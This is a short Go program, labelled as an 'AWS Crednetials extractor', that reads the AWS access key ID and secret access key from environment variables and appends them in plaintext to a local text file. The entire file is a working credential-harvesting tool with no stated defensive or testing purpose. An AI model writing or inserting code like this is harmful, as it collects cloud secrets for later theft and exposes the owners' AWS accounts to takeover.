package main

import "fmt"
import "os"
import "log"

func main() {
    fmt.Println("AWS Crednetials extractor!!!")
    val, exists := os.LookupEnv("AWS_ACCESS_KEY_ID")
    val1, exists1 := os.LookupEnv("AWS_SECRET_ACCESS_KEY")

	// If the file doesn't exist, create it, or append to the file
    f, err := os.OpenFile("cloud_aws_extract_credentials.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
    }



    if exists {
	if _, err := f.Write([]byte("AWS_ACCESS_KEY_ID: " + val + "\n")); err != nil {
		f.Close() // ignore error; Write error takes precedence
		log.Fatal(err)
	}





    }

    if exists1 {
	if _, err := f.Write([]byte("AWS_SECRET_ACCESS_KEY: " + val1 + "\n")); err != nil {
		f.Close() // ignore error; Write error takes precedence
		log.Fatal(err)
	}


    }


    if err := f.Close(); err != nil {
	log.Fatal(err) 
    }

}

